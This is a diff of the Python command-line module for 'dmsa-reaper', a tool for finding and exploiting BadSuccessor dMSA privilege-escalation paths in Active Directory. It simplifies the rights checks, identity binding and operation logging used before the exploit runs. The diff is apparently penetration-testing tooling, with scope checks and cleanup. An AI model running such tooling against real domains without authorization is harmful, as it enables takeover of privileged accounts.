@@ -1,116 +1,85 @@
 from __future__ import annotations
 
-import hashlib
-import contextlib
-import io
 import json
 import os
-import shlex
-import subprocess
 from pathlib import Path
 from typing import Any, Optional
 
 import typer
 from rich import print
 from rich.panel import Panel
-from rich.table import Table
 
+from dmsa_reaper import __version__
 from dmsa_reaper.auth.ldap_bind import LdapAuthConfig, bind
 from dmsa_reaper.constants import DEFAULT_SD_FLAGS
-from dmsa_reaper.map.runner import load_offline_fixture, run_live_map
 from dmsa_reaper.map.principal import get_current_principal
-from dmsa_reaper.models import CheckStatus, MapState, PathCandidate, TargetObject
-from dmsa_reaper.ops.campaign import (
-    campaign_markdown,
-    campaign_step,
-    campaign_summary,
-    final_status as campaign_final_status,
-    new_campaign_id,
-)
+from dmsa_reaper.map.runner import run_live_map
+from dmsa_reaper.models import MapState, Operation, PathCandidate
+from dmsa_reaper.ops.cleanup import cleanup_operation
 from dmsa_reaper.ops.operation_log import (
     configure_ops_dir,
     get_ops_dir,
     load_operation,
     save_operation,
 )
-from dmsa_reaper.ops.cleanup import cleanup_operation
-from dmsa_reaper.ops.ticket import TicketAcquisitionError, acquire_dmsa_ticket
-from dmsa_reaper.ops.external_proof import (
-    ExternalProofError,
-    BASE_PROOF_TYPE,
-    find_secret_material,
-    load_evidence_file,
-    record_kerberos_base_check,
-    record_external_verification,
-    validate_kerberos_base_evidence_for_operation,
-    validate_kerberos_evidence,
+from dmsa_reaper.ops.ticket import (
+    TicketAcquisitionError,
+    acquire_dmsa_tgt,
+    acquire_dmsa_ticket,
 )
-from dmsa_reaper.ops.framework import (
-    BADSUCCESSOR_PRIMITIVES,
-    assess_badsuccessor,
-    assess_ouroboros,
-    build_badsuccessor_plan,
-    build_operation_report,
-    build_ouroboros_plan,
-    build_ouroboros_simulation,
-    classified_paths,
-    is_sensitive_target,
-    operation_lifecycle_summary,
-    operation_report_markdown,
-)
-from dmsa_reaper.ops.kerberos_diagnostics import (
-    inspect_dns_environment,
-    inspect_kerberos_environment,
-)
-from dmsa_reaper.ops.profiles import get_profile
-from dmsa_reaper.ops.proof_collector import (
-    ProofCollectionError,
-    collect_base_proof_from_klist,
-)
-from dmsa_reaper.ops.verify import record_ldap_verification, verify_operation_ldap_details
 from dmsa_reaper.output.console import print_paths
 from dmsa_reaper.paths.classifier import classify_paths
 from dmsa_reaper.paths.ranking import rank_paths
 from dmsa_reaper.primitives.registry import get_primitives
-from dmsa_reaper.utils import parse_int_auto
 
-app = typer.Typer(no_args_is_help=True)
-badsuccessor_app = typer.Typer(no_args_is_help=True)
-ouroboros_app = typer.Typer(no_args_is_help=True)
-campaign_app = typer.Typer(no_args_is_help=True)
-graph_app = typer.Typer(no_args_is_help=True)
-proof_app = typer.Typer(no_args_is_help=True)
-# Research/framework command implementations remain importable for development,
-# but are intentionally not registered in the engagement-facing CLI.  The
-# supported operator lifecycle is map/paths/exploit/verify/ticket/cleanup.
 
-# DACL primitives that require scope enforcement.
+app = typer.Typer(
+    add_completion=False,
+    context_settings={"help_option_names": ["-h", "--help"]},
+    help="Find and exploit BadSuccessor paths in Active Directory.",
+    no_args_is_help=True,
+)
+
 _DACL_PRIMITIVES = frozenset({"dacl-container-escalate", "dacl-target-escalate"})
-_POSTPATCH_TARGET_ATTRS = frozenset({
-    "msDS-SupersededManagedAccountLink",
-    "msDS-SupersededServiceAccountState",
-})
-_POSTPATCH_TARGET_WRITERS = frozenset({
-    "postpatch-mutual-pair",
-    "existing-dmsa-postpatch-mutual",
-})
-
-# Rights that indicate CreateChild access on a container.
+_LEGACY_PRIMITIVES = frozenset({"legacy-oneway-link", "existing-dmsa-legacy-link"})
 _CREATE_CHILD_RIGHTS = frozenset({"CreateChild", "CreateChild:dMSA", "GenericAll"})
-
-# Rights that allow DACL or owner-based escalation on a container or target.
 _DACL_CONTROL_RIGHTS = frozenset({"WriteDACL", "GenericAll"})
+_DMSA_MIGRATION_ATTR_RIGHTS = frozenset(
+    {
+        "WriteProperty:msDS-ManagedAccountPrecededByLink",
+        "WriteProperty:msDS-DelegatedMSAState",
+    }
+)
+_POSTPATCH_TARGET_ATTRS = frozenset(
+    {
+        "msDS-SupersededManagedAccountLink",
+        "msDS-SupersededServiceAccountState",
+    }
+)
 
-# Attribute-specific rights required for dMSA migration (both must be present
-# unless GenericAll or GenericWrite is held instead).
-_DMSA_MIGRATION_ATTR_RIGHTS = frozenset({
-    "WriteProperty:msDS-ManagedAccountPrecededByLink",
-    "WriteProperty:msDS-DelegatedMSAState",
-})
+
+def _version_callback(value: bool) -> None:
+    if value:
+        typer.echo(f"dmsa-reaper {__version__}")
+        raise typer.Exit()
+
+
+@app.callback()
+def main(
+    version: bool = typer.Option(
+        False,
+        "--version",
+        callback=_version_callback,
+        is_eager=True,
+        help="Show the version and exit.",
+    ),
+) -> None:
+    del version
 
 
 def _write_json(path: Path, payload: object) -> None:
-    path.write_text(json.dumps(payload, indent=2, default=str), encoding="utf-8")
+    path.parent.mkdir(parents=True, exist_ok=True)
+    path.write_text(json.dumps(payload, indent=2, default=str) + "\n", encoding="utf-8")
 
 
 def _has_dmsa_migration_rights(right_names: set[str]) -> bool:
@@ -121,334 +90,106 @@ def _has_dmsa_migration_rights(right_names: set[str]) -> bool:
     )
 
 
-def _require_current_principal_sid(
-    state: "MapState",
-    allow_override: bool,
-    override_flag: str,
-) -> tuple[str | None, list[str]]:
-    """Return (sid, warnings) for the current principal, or block if it is missing.
-
-    When current_principal is present, returns (sid, []).
-    When current_principal is absent and allow_override is True, returns
-    (None, [warning]) — the caller must record the warning and skip the
-    principal-filtered rights check.
-    When current_principal is absent and allow_override is False, raises
-    typer.BadParameter.
-    """
+def _current_principal_sid(state: MapState) -> str:
     if state.current_principal is None or not state.current_principal.sid:
-        if not allow_override:
-            raise typer.BadParameter(
-                "state.current_principal is missing — cannot verify rights for the current "
-                "principal. Re-run map with authentication or pass "
-                f"{override_flag} for an authorized lab override."
-            )
-        return None, [
-            f"state.current_principal missing; rights not verified by principal "
-            f"({override_flag} supplied)."
-        ]
-    return state.current_principal.sid, []
+        raise typer.BadParameter(
+            "state has no current principal; map again with authenticated credentials"
+        )
+    return state.current_principal.sid
 
 
-def _check_container_create_rights(
-    state: "MapState | None",
+def _require_container_right(
+    state: MapState,
     container_dn: str,
-    allow_unmapped_container: bool,
-) -> list[str]:
-    """Validate CreateChild rights on container_dn from mapped state.
-
-    Rights are filtered to the current principal's SID. Missing current_principal
-    blocks execution unless allow_unmapped_container is True.
-    Returns advisory warnings. Raises typer.BadParameter on hard blocks.
-    """
-    if state is None:
-        if not allow_unmapped_container:
-            raise typer.BadParameter(
-                f"Cannot verify CreateChild rights on container {container_dn}: "
-                "state.json is unavailable. "
-                "Pass --allow-unmapped-container to override."
-            )
-        return [
-            f"Container {container_dn!r}: state unavailable; CreateChild rights not verified "
-            "(--allow-unmapped-container supplied)."
-        ]
-
+    accepted_rights: frozenset[str],
+    label: str,
+) -> None:
     container = next(
-        (c for c in state.containers if c.dn.lower() == container_dn.lower()), None
+        (item for item in state.containers if item.dn.lower() == container_dn.lower()),
+        None,
     )
     if container is None:
-        if not allow_unmapped_container:
-            raise typer.BadParameter(
-                f"Container {container_dn!r} is not in state.containers. "
-                "Cannot confirm CreateChild rights from mapped state. "
-                "Re-run map or pass --allow-unmapped-container to override."
-            )
-        return [
-            f"Container {container_dn!r}: not in state.containers; CreateChild rights not verified "
-            "(--allow-unmapped-container supplied)."
-        ]
+        raise typer.BadParameter(
+            f"container is absent from mapped state: {container_dn}. Run map again."
+        )
+    principal_sid = _current_principal_sid(state)
+    if not any(
+        right.principal_sid == principal_sid and right.right in accepted_rights
+        for right in container.rights
+    ):
+        raise typer.BadParameter(
+            f"mapped principal does not have {label} on container {container_dn}"
+        )
 
-    principal_sid, principal_warnings = _require_current_principal_sid(
-        state, allow_unmapped_container, "--allow-unmapped-container"
+
+def _require_dmsa_migration_right(state: MapState, dmsa_dn: str) -> None:
+    dmsa = next(
+        (item for item in state.dmsas if item.dn.lower() == dmsa_dn.lower()),
+        None,
     )
-    if principal_sid is None:
-        return principal_warnings
-
-    has_create_child = any(
-        r.right in _CREATE_CHILD_RIGHTS and r.principal_sid == principal_sid
-        for r in container.rights
-    )
-    if not has_create_child:
-        if not allow_unmapped_container:
-            raise typer.BadParameter(
-                f"Container {container_dn!r} has no CreateChild rights for the current principal "
-                "in the mapped state. "
-                "Re-run map or pass --allow-unmapped-container to override."
-            )
-        return [
-            f"Container {container_dn!r}: lacks CreateChild rights in mapped state; "
-            "proceeding because --allow-unmapped-container was supplied."
-        ]
-    return []
-
-
-def _validate_dmsa_migration_rights(
-    state: "MapState | None",
-    dmsa_dn: str,
-    allow_unmapped_dmsa: bool,
-) -> list[str]:
-    """Validate dMSA migration rights from mapped state.
-
-    Rights are filtered to the current principal's SID. Missing current_principal
-    blocks execution unless allow_unmapped_dmsa is True.
-    Returns advisory warnings. Raises typer.BadParameter on hard blocks.
-    """
-    if state is None:
-        if not allow_unmapped_dmsa:
-            raise typer.BadParameter(
-                f"Cannot verify dMSA migration rights on {dmsa_dn!r}: "
-                "state.json is unavailable. "
-                "Pass --allow-unmapped-dmsa for an authorized lab override."
-            )
-        return [
-            f"dMSA {dmsa_dn!r}: state unavailable; migration rights not verified "
-            "(--allow-unmapped-dmsa supplied)."
-        ]
-
-    dmsa = next((d for d in state.dmsas if d.dn.lower() == dmsa_dn.lower()), None)
     if dmsa is None:
-        if not allow_unmapped_dmsa:
-            raise typer.BadParameter(
-                f"dMSA {dmsa_dn!r} is not in state.dmsas. "
-                "Cannot verify migration rights from mapped state. "
-                "Re-run map or pass --allow-unmapped-dmsa for an authorized lab override."
-            )
-        return [
-            f"dMSA {dmsa_dn!r}: not in state.dmsas; migration rights not verified "
-            "(--allow-unmapped-dmsa supplied)."
-        ]
+        raise typer.BadParameter(f"dMSA is absent from mapped state: {dmsa_dn}")
+    principal_sid = _current_principal_sid(state)
+    rights = {
+        right.right
+        for right in dmsa.rights
+        if right.principal_sid == principal_sid
+    }
+    if not _has_dmsa_migration_rights(rights):
+        raise typer.BadParameter(
+            f"mapped principal does not have dMSA migration rights on {dmsa_dn}"
+        )
 
-    principal_sid, principal_warnings = _require_current_principal_sid(
-        state, allow_unmapped_dmsa, "--allow-unmapped-dmsa"
+
+def _require_target_dacl_right(state: MapState, target_dn: str) -> None:
+    target = next(
+        (item for item in state.targets if item.dn.lower() == target_dn.lower()),
+        None,
     )
-    if principal_sid is None:
-        return principal_warnings
-
-    right_names = {r.right for r in dmsa.rights if r.principal_sid == principal_sid}
-    if not _has_dmsa_migration_rights(right_names):
-        if not allow_unmapped_dmsa:
-            raise typer.BadParameter(
-                f"dMSA {dmsa_dn!r} is in state.dmsas but lacks migration rights "
-                "for the current principal "
-                "(requires GenericAll, GenericWrite, or both "
-                "WriteProperty:msDS-ManagedAccountPrecededByLink and "
-                "WriteProperty:msDS-DelegatedMSAState). "
-                "Paths.json may be stale. Re-run map or pass --allow-unmapped-dmsa "
-                "for an authorized lab override."
-            )
-        return [
-            f"dMSA {dmsa_dn!r}: lacks migration rights for the current principal in mapped state; "
-            "proceeding because --allow-unmapped-dmsa was supplied."
-        ]
-    return []
-
-
-def _validate_container_dacl_control(
-    state: "MapState | None",
-    container_dn: str,
-    allow_unmapped_container: bool,
-) -> list[str]:
-    """Validate WriteDACL/GenericAll on container_dn from mapped state.
-
-    Rights are filtered to the current principal's SID. Missing current_principal
-    blocks execution unless allow_unmapped_container is True.
-    Returns advisory warnings. Raises typer.BadParameter on hard blocks.
-    """
-    if state is None:
-        if not allow_unmapped_container:
-            raise typer.BadParameter(
-                f"Cannot verify WriteDACL rights on container {container_dn!r}: "
-                "state.json is unavailable. "
-                "Pass --allow-unmapped-container for an authorized lab override."
-            )
-        return [
-            f"Container {container_dn!r}: state unavailable; DACL control rights not verified "
-            "(--allow-unmapped-container supplied)."
-        ]
-
-    container = next((c for c in state.containers if c.dn.lower() == container_dn.lower()), None)
-    if container is None:
-        if not allow_unmapped_container:
-            raise typer.BadParameter(
-                f"Container {container_dn!r} is not in state.containers. "
-                "dacl-container-escalate requires confirmed WriteDACL rights. "
-                "Re-run map or pass --allow-unmapped-container for an authorized lab override."
-            )
-        return [
-            f"Container {container_dn!r}: not in state.containers; DACL control rights not verified "
-            "(--allow-unmapped-container supplied)."
-        ]
-
-    principal_sid, principal_warnings = _require_current_principal_sid(
-        state, allow_unmapped_container, "--allow-unmapped-container"
-    )
-    if principal_sid is None:
-        return principal_warnings
-
-    has_dacl_ctrl = any(
-        r.right in _DACL_CONTROL_RIGHTS and r.principal_sid == principal_sid
-        for r in container.rights
-    )
-    if not has_dacl_ctrl:
-        if not allow_unmapped_container:
-            raise typer.BadParameter(
-                f"Container {container_dn!r} is in state.containers but lacks "
-                "WriteDACL/GenericAll for the current principal. "
-                "Paths.json may be stale. Re-run map or pass --allow-unmapped-container "
-                "for an authorized lab override."
-            )
-        return [
-            f"Container {container_dn!r}: lacks DACL control rights in mapped state; "
-            "proceeding because --allow-unmapped-container was supplied."
-        ]
-    return []
-
-
-def _validate_target_dacl_control(
-    state: "MapState | None",
-    target_dn: str,
-    allow_unmapped_target: bool,
-) -> list[str]:
-    """Validate WriteDACL/GenericAll on target_dn from mapped state.
-
-    Rights are filtered to the current principal's SID. Missing current_principal
-    blocks execution unless allow_unmapped_target is True.
-    Returns advisory warnings. Raises typer.BadParameter on hard blocks.
-    """
-    if state is None:
-        if not allow_unmapped_target:
-            raise typer.BadParameter(
-                f"Cannot verify WriteDACL rights on target {target_dn!r}: "
-                "state.json is unavailable. "
-                "Pass --allow-unmapped-target for an authorized lab override."
-            )
-        return [
-            f"Target {target_dn!r}: state unavailable; DACL control rights not verified "
-            "(--allow-unmapped-target supplied)."
-        ]
-
-    target = next((t for t in state.targets if t.dn.lower() == target_dn.lower()), None)
     if target is None:
-        if not allow_unmapped_target:
-            raise typer.BadParameter(
-                f"Target {target_dn!r} is not in state.targets. "
-                "dacl-target-escalate requires confirmed WriteDACL rights on this target. "
-                "Re-run map or pass --allow-unmapped-target for an authorized lab override."
-            )
-        return [
-            f"Target {target_dn!r}: not in state.targets; DACL control rights not verified "
-            "(--allow-unmapped-target supplied)."
-        ]
-
-    principal_sid, principal_warnings = _require_current_principal_sid(
-        state, allow_unmapped_target, "--allow-unmapped-target"
-    )
-    if principal_sid is None:
-        return principal_warnings
-
-    right_names = {r.right for r in target.rights if r.principal_sid == principal_sid}
-    if not right_names & _DACL_CONTROL_RIGHTS:
-        if not allow_unmapped_target:
-            raise typer.BadParameter(
-                f"Target {target_dn!r} is in state.targets but lacks "
-                "WriteDACL/GenericAll for the current principal. "
-                "Paths.json may be stale. Re-run map or pass --allow-unmapped-target "
-                "for an authorized lab override."
-            )
-        return [
-            f"Target {target_dn!r}: lacks DACL control rights in mapped state; "
-            "proceeding because --allow-unmapped-target was supplied."
-        ]
-    return []
+        raise typer.BadParameter(f"target is absent from mapped state: {target_dn}")
+    principal_sid = _current_principal_sid(state)
+    if not any(
+        right.principal_sid == principal_sid and right.right in _DACL_CONTROL_RIGHTS
+        for right in target.rights
+    ):
+        raise typer.BadParameter(
+            f"mapped principal does not have WriteDACL/GenericAll on {target_dn}"
+        )
 
 
-def _writes_postpatch_target_attrs(primitive_name: str, chain: str | None) -> bool:
-    return primitive_name in _POSTPATCH_TARGET_WRITERS or (
-        primitive_name == "dacl-container-escalate" and chain == "postpatch"
-    )
+def _writes_postpatch_target(
+    primitive_name: str,
+    chain: str | None,
+) -> bool:
+    return primitive_name in {
+        "postpatch-mutual-pair",
+        "existing-dmsa-postpatch-mutual",
+    } or (primitive_name == "dacl-container-escalate" and chain == "postpatch")
 
 
-def _find_target(state: MapState, dn: str) -> TargetObject | None:
-    return next((t for t in state.targets if t.dn.lower() == dn.lower()), None)
-
-
-def _validate_exact_postpatch_target(
-    *,
-    state: MapState | None,
+def _target_writable_attrs(
+    state: MapState,
     target_dn: str | None,
     primitive_name: str,
     chain: str | None,
-    allow_unmapped_target: bool,
-    confirm: bool,
-) -> tuple[list[str], list[str] | None]:
-    """Validate exact target-side WriteProperty proof for postpatch target writes.
-
-    Returns (warnings, target_writable_attrs). When state is absent, dry-runs are
-    allowed to proceed without enrichment; confirmed execution requires either a
-    mapped target or --allow-unmapped-target.
-    """
-    if not _writes_postpatch_target_attrs(primitive_name, chain) or not target_dn:
-        return [], None
-
-    warning = (
-        f"Target {target_dn!r} was not found in state.targets; proceeding because "
-        "--allow-unmapped-target was supplied. Target-side WriteProperty was not proven."
+) -> list[str] | None:
+    if not target_dn or not _writes_postpatch_target(primitive_name, chain):
+        return None
+    target = next(
+        (item for item in state.targets if item.dn.lower() == target_dn.lower()),
+        None,
     )
-
-    if state is None:
-        if confirm and not allow_unmapped_target:
-            raise typer.BadParameter(
-                f"Cannot validate target-side WriteProperty for {target_dn!r}: state is unavailable. "
-                "Use a valid --state or pass --allow-unmapped-target for an authorized lab override."
-            )
-        return ([warning] if allow_unmapped_target else []), None
-
-    target = _find_target(state, target_dn)
     if target is None:
-        if allow_unmapped_target:
-            return [warning], None
         raise typer.BadParameter(
-            f"Target {target_dn!r} is not present in state.targets. "
-            "Use --expand-targets / a fresh map, or pass --allow-unmapped-target for an authorized lab override."
+            f"postpatch target is absent from mapped state: {target_dn}"
         )
-
-    writable = set(target.writable_attrs)
-    if not _POSTPATCH_TARGET_ATTRS.issubset(writable):
-        missing = sorted(_POSTPATCH_TARGET_ATTRS - writable)
+    missing = sorted(_POSTPATCH_TARGET_ATTRS - set(target.writable_attrs))
+    if missing:
         raise typer.BadParameter(
-            f"Target {target_dn!r} is mapped but lacks required target-side WriteProperty: "
-            f"{', '.join(missing)}"
+            f"target lacks required WriteProperty rights: {', '.join(missing)}"
         )
-    return [], target.writable_attrs
+    return target.writable_attrs
 
 
 def _normalized_account(value: str) -> str:
@@ -458,32 +199,40 @@ def _normalized_account(value: str) -> str:
 def _validate_execution_binding(
     *,
     conn: Any,
-    state: MapState | None,
+    state: MapState,
     username: str | None,
     kerberos: bool,
     dc_host: str | None,
     dc_ip: str | None,
 ) -> dict[str, str]:
-    """Reject identity/DC drift before the durable operation and first write."""
-    if state is None or state.current_principal is None:
+    mapped_principal = state.current_principal
+    if mapped_principal is None:
         raise typer.BadParameter(
-            "confirmed execution requires state.current_principal from a fresh authenticated map"
+            "confirmed execution requires an authenticated map with a current principal"
         )
     if not username:
         raise typer.BadParameter(
-            "--username is required to bind execution identity to the SID used during mapping"
+            "--username is required so execution uses the account mapped in state.json"
         )
     default_nc = state.environment.default_nc or ",".join(
-        f"DC={label}" for label in (state.environment.domain or "").split(".") if label
+        f"DC={label}"
+        for label in (state.environment.domain or "").split(".")
+        if label
     )
     if not default_nc:
         raise typer.BadParameter("mapped state has no default naming context")
 
     if kerberos:
         cache_name = os.environ.get("KRB5CCNAME", "")
-        cache_path = cache_name[5:] if cache_name.upper().startswith("FILE:") else cache_name
+        cache_path = (
+            cache_name[5:]
+            if cache_name.upper().startswith("FILE:")
+            else cache_name
+        )
         if not cache_path:
-            raise typer.BadParameter("KRB5CCNAME must name a FILE ccache for identity validation")
+            raise typer.BadParameter(
+                "KRB5CCNAME must point to a FILE ccache for Kerberos execution"
+            )
         try:
             from impacket.krb5.ccache import CCache
 
@@ -495,18 +244,20 @@ def _validate_execution_binding(
                 else str(principal)
             )
         except Exception as exc:
-            raise typer.BadParameter(f"cannot validate Kerberos ccache identity: {exc}") from exc
+            raise typer.BadParameter(f"cannot read Kerberos ccache: {exc}") from exc
         if _normalized_account(cache_principal) != _normalized_account(username):
             raise typer.BadParameter(
-                f"Kerberos ccache principal {cache_principal!r} does not match --username"
+                f"ccache principal {cache_principal!r} does not match --username"
             )
 
     live = get_current_principal(conn, default_nc, username)
     if live is None or not live.sid:
-        raise typer.BadParameter("execution credentials could not be resolved to an object SID")
-    if live.sid.lower() != state.current_principal.sid.lower():
         raise typer.BadParameter(
-            f"execution SID {live.sid} does not match mapped SID {state.current_principal.sid}"
+            "execution credentials could not be resolved to an object SID"
+        )
+    if live.sid.lower() != mapped_principal.sid.lower():
+        raise typer.BadParameter(
+            f"execution SID {live.sid} does not match mapped SID {mapped_principal.sid}"
         )
 
     mapped_host = state.environment.mapped_dc_host
@@ -528,11 +279,10 @@ def _revalidate_mapped_guids(
     state: MapState,
     dns: list[str | None],
 ) -> dict[str, str]:
-    """Ensure selected mapped objects have not been replaced since discovery."""
     from dmsa_reaper.primitives._ldap_helpers import read_object_guid
 
     objects: list[Any] = [*state.containers, *state.targets, *state.dmsas]
-    by_dn = {obj.dn.lower(): obj for obj in objects}
+    by_dn = {item.dn.lower(): item for item in objects}
     checked: dict[str, str] = {}
     for dn in dict.fromkeys(value for value in dns if value):
         mapped = by_dn.get(dn.lower())
@@ -541,225 +291,11 @@ def _revalidate_mapped_guids(
         live_guid = read_object_guid(conn, dn)
         if live_guid.lower() != mapped.object_guid.lower():
             raise typer.BadParameter(
-                f"objectGUID changed since mapping for {dn!r}: "
-                f"mapped={mapped.object_guid} live={live_guid}"
+                f"object changed since mapping: {dn} "
+                f"(mapped {mapped.object_guid}, live {live_guid})"
             )
         checked[dn] = live_guid
     return checked
-
-
-def _external_output_metadata(
-    *,
-    mode: str,
-    exit_code: int,
-    stdout: str,
-    stderr: str,
-    argv: list[str] | None = None,
-    command: str | None = None,
-    store_output: bool = False,
-) -> dict:
-    if store_output:
-        secret_findings = find_secret_material({"stdout": stdout, "stderr": stderr})
-        if secret_findings:
-            raise ValueError(
-                "refusing to store secret-looking external output: "
-                + "; ".join(secret_findings)
-            )
-    metadata = {
-        "mode": mode,
-        "exit_code": exit_code,
-        "stdout_length": len(stdout.encode("utf-8")),
-        "stderr_length": len(stderr.encode("utf-8")),
-        "stdout_sha256": hashlib.sha256(stdout.encode("utf-8")).hexdigest(),
-        "stderr_sha256": hashlib.sha256(stderr.encode("utf-8")).hexdigest(),
-    }
-    if argv is not None:
-        metadata["argv"] = argv
-    if command is not None:
-        metadata["command"] = command
-    if store_output:
-        metadata["stdout"] = stdout
-        metadata["stderr"] = stderr
-    return metadata
-
-
-def _classify_external_failure(stdout: str, stderr: str, *, dmsa: bool = False) -> str:
-    text = f"{stdout}\n{stderr}".lower()
-    if "krb_ap_err_skew" in text or "clock skew" in text:
-        return "kerberos-clock-skew"
-    if "dns" in text or "name or service not known" in text or "could not resolve" in text:
-        return "kerberos-dns-resolution"
-    if "krb5ccname" in text or "ccache" in text or "credential cache" in text:
-        return "kerberos-cache-format"
-    if dmsa and ("krb_err_generic" in text or "kdc_err" in text or "kerberos sessionerror" in text):
-        return "kerberos-dmsa-proof-failed"
-    return "kerberos-tooling-inconclusive"
-
-
-def _adapter_template_from_file(path: Path) -> str:
-    raw = json.loads(path.read_text(encoding="utf-8"))
-    if not isinstance(raw, dict):
-        raise typer.BadParameter("--adapter-command-file must contain a JSON object")
-    if isinstance(raw.get("command"), str):
-        return raw["command"]
-    if isinstance(raw.get("argv"), list) and all(isinstance(item, str) for item in raw["argv"]):
-        return shlex.join(raw["argv"])
-    raise typer.BadParameter("--adapter-command-file must contain string 'command' or string-list 'argv'")
-
-
-def _operation_target_sam(op) -> str:
-    direct = op.metadata.get("target_sam")
-    if direct:
-        return str(direct).rstrip("$")
-    target_dn = op.metadata.get("target_dn")
-    if not target_dn:
-        path = op.metadata.get("path")
-        if isinstance(path, dict):
-            direct = path.get("target_sam")
-            if direct:
-                return str(direct).rstrip("$")
-            target_dn = path.get("target_dn")
-    if target_dn:
-        first = str(target_dn).split(",", 1)[0]
-        if first.lower().startswith("cn="):
-            return first[3:]
-    return ""
-
-
-def _render_adapter_command(template: str, op) -> str:
-    target_dn = op.metadata.get("target_dn")
-    path = op.metadata.get("path")
-    if not target_dn and isinstance(path, dict):
-        target_dn = path.get("target_dn")
-    values = {
-        "operation_id": op.id,
-        "target_dn": target_dn or "",
-        "target_sam": _operation_target_sam(op),
-        "created_dmsa_dn": op.metadata.get("created_dmsa_dn", ""),
-        "created_dmsa_sam": op.metadata.get("created_dmsa_sam", ""),
-    }
-    return template.format(**values)
-
-
-def _load_paths_for_state(
-    state_path: Path,
-    paths_file: Path | None,
-    *,
-    expand_targets: bool,
-    only: list[str] | None = None,
-    exclude_legacy: bool = False,
-    include_sensitive_targets: bool = False,
-) -> tuple[MapState, list[PathCandidate]]:
-    state = MapState.load(state_path)
-    if paths_file:
-        raw = json.loads(paths_file.read_text(encoding="utf-8"))
-        paths = rank_paths([PathCandidate.model_validate(p) for p in raw])
-        if only:
-            wanted = set(only)
-            if "badsuccessor" in wanted:
-                wanted.remove("badsuccessor")
-                wanted.update(BADSUCCESSOR_PRIMITIVES)
-            if "ouroboros" in wanted:
-                wanted.remove("ouroboros")
-                wanted.update({
-                    "postpatch-mutual-pair",
-                    "existing-dmsa-postpatch-mutual",
-                    "self-pkinit-loop",
-                })
-            paths = [path for path in paths if path.primitive in wanted]
-        if exclude_legacy:
-            paths = [
-                path for path in paths
-                if path.primitive not in {"legacy-oneway-link", "existing-dmsa-legacy-link"}
-            ]
-        if not include_sensitive_targets:
-            paths = [path for path in paths if not is_sensitive_target(path.target_dn)]
-        return state, paths
-    return state, classified_paths(
-        state,
-        expand_targets=expand_targets,
-        only=only,
-        exclude_legacy=exclude_legacy,
-        include_sensitive_targets=include_sensitive_targets,
-    )
-
-
-def _select_path(paths: list[PathCandidate], path_id: str) -> PathCandidate:
-    selected = next((path for path in paths if path.id == path_id), None)
-    if selected is None:
-        raise typer.BadParameter(f"path not found: {path_id}")
-    return selected
-
-
-def _kerberos_ready_for_state(state: MapState) -> tuple[bool, list[str]]:
-    dc_fqdn = None
-    if state.environment.dcs:
-        dc_fqdn = state.environment.dcs[0].get("dnsHostName")
-    kerberos_diag = inspect_kerberos_environment(
-        domain=state.environment.domain or "",
-        dc_fqdn=dc_fqdn,
-        run_cache_checks=True,
-    )
-    dns_diag = inspect_dns_environment(domain=state.environment.domain or "", dc_fqdn=dc_fqdn)
-    notes = []
-    if kerberos_diag.time_skew_ok is False:
-        notes.append("Kerberos time skew is outside tolerance")
-    if kerberos_diag.ccache_style in {"unset", "keyring"}:
-        notes.append(f"KRB5CCNAME cache style is {kerberos_diag.ccache_style}")
-    if dns_diag.srv_lookup_ok is False:
-        notes.append("Kerberos DNS SRV lookup failed")
-    return not notes, notes
-
-
-def _require_kerberos_ready_if_requested(state: MapState, required: bool) -> None:
-    if not required:
-        return
-    ready, notes = _kerberos_ready_for_state(state)
-    if not ready:
-        raise typer.BadParameter(
-            "--require-kerberos-ready failed: " + "; ".join(notes)
-        )
-
-
-def _print_badsuccessor_table(assessment: dict[str, Any]) -> None:
-    table = Table(title="BadSuccessor assessment")
-    table.add_column("Path")
-    table.add_column("Primitive")
-    table.add_column("Status")
-    table.add_column("Target")
-    for path in assessment["paths"]:
-        table.add_row(
-            str(path["path_id"]),
-            str(path["primitive"]),
-            str(path["status"]),
-            str(path.get("target_dn") or f"{path.get('candidate_targets_count', 0)} grouped targets"),
-        )
-    print(table)
-    print("LDAP proof is not Kerberos proof; next required proof is kerberos-dmsa-proof.")
-
-
-def _print_ouroboros_summary(assessment: dict[str, Any]) -> None:
-    print(
-        "ouroboros "
-        f"status={assessment['ouroboros_status']} "
-        f"capable={str(assessment['ouroboros_capable']).lower()} "
-        f"paths={len(assessment['paths'])}"
-    )
-    for blocker in assessment["ouroboros_blockers"]:
-        print(f"blocked: {blocker}")
-    for warning in assessment["ouroboros_warnings"]:
-        print(f"warning: {warning}")
-
-
-# Shared LDAP option definitions reused across commands.
-_OPT_DOMAIN = typer.Option(..., "--domain", "-d", help="Target domain FQDN.")
-_OPT_DC_IP = typer.Option(None, "--dc-ip", help="DC IP address.")
-_OPT_DC_HOST = typer.Option(None, "--dc-host", help="DC hostname.")
-_OPT_USER = typer.Option(None, "--username", "-u", help="Bind username.")
-_OPT_PASS = typer.Option(None, "--password", "-p", help="Bind password.")
-_OPT_KRB = typer.Option(False, "--kerberos", "-k", help="Use ccache (Kerberos).")
-_OPT_LDAPS = typer.Option(False, "--use-ldaps", help="Connect over LDAPS (port 636).")
-_OPT_STARTTLS = typer.Option(False, "--start-tls", help="Upgrade LDAP port 389 with STARTTLS.")
 
 
 def _make_ldap_config(
@@ -770,7 +306,7 @@ def _make_ldap_config(
     password: str | None,
     kerberos: bool,
     use_ldaps: bool,
-    start_tls: bool = False,
+    start_tls: bool,
 ) -> LdapAuthConfig:
     return LdapAuthConfig(
         domain=domain,
@@ -784,9 +320,127 @@ def _make_ldap_config(
     )
 
 
+def _select_path(state: MapState, path_id: str) -> PathCandidate:
+    paths = rank_paths(classify_paths(state, expand_targets=True))
+    selected = next((path for path in paths if path.id == path_id), None)
+    if selected is None:
+        raise typer.BadParameter(
+            f"path not found: {path_id}. Run 'dmsa-reaper paths --state ...' again."
+        )
+    return selected
+
+
+def _populate_operation(
+    operation: Operation,
+    *,
+    state: MapState,
+    target_dn: str | None,
+    container_dn: str | None,
+    chain: str | None,
+    dmsa_name: str | None,
+    target_writable_attrs: list[str] | None,
+    allow_broad_dacl: bool,
+    scope_allow_broad_dacl: bool,
+    dc_host: str | None,
+    dc_ip: str | None,
+) -> None:
+    selected_path = operation.metadata.get("path")
+    if not isinstance(selected_path, dict):
+        selected_path = {}
+    if target_dn:
+        operation.metadata["target_dn"] = target_dn
+    if container_dn:
+        operation.metadata["container_dn"] = container_dn
+    if chain:
+        operation.metadata["chain"] = chain
+    if dmsa_name:
+        operation.metadata["dmsa_name"] = dmsa_name
+    if target_writable_attrs is not None:
+        operation.metadata["target_writable_attrs"] = target_writable_attrs
+    if allow_broad_dacl:
+        operation.metadata["allow_broad_dacl"] = True
